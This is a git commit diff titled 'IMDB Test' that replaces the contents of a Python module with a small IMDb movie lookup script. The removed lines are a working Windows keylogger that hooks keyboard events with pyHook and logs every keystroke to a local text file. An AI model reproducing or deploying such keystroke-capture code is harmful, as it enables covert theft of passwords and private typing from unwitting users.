11322f9258f617f8ad11bba2f01f0ed307503028
root <gajanaruto@gmail.com>
2016-12-22 20:59:03 +0530

    IMDB Test

--- modules/Key.py
+++ modules/Key.py
@@ -1,11 +1,5 @@
-import pyHook, pythoncom, sys, logging
-file_log = 'C:keyloggeroutput.txt'
-def OnKeyboardEvent(event):
-    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-    chr(event.Ascii)
-    logging.log(10,chr(event.Ascii))
-    return True
-hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = OnKeyboardEvent
-hooks_manager.HookKeyboard()
-pythoncom.PumpMessages()
+from imdb import IMDb
+ia = IMDb()
+
+the_matrix = ia.get_movie('0133093')
+print(the_matrix)
